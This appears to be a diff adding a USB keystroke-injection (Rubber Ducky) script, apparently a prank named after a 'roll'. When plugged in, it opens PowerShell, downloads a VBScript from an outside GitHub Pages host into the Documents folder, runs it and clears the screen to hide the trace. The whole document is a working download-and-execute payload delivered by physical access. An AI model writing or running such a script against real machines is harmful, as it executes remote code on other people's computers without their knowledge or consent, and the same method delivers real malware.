@@ -1,0 +1,19 @@
+DELAY 3000
+WINDOWS r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 1000
+REM add roll vbscript download link here later
+STRING $downurl = "https://Cj-MCB.github.io/rollhost/roll.vbs"
+ENTER
+STRING $dest = "$env:USERPROFILE\Documents\roll.vbs"
+ENTER
+STRING Invoke-WebRequest -Uri $downurl -OutFile $dest
+ENTER
+STRING cd "$env:USERPROFILE\Documents\"
+ENTER
+STRING start roll.vbs
+ENTER
+STRING cls
+ENTER
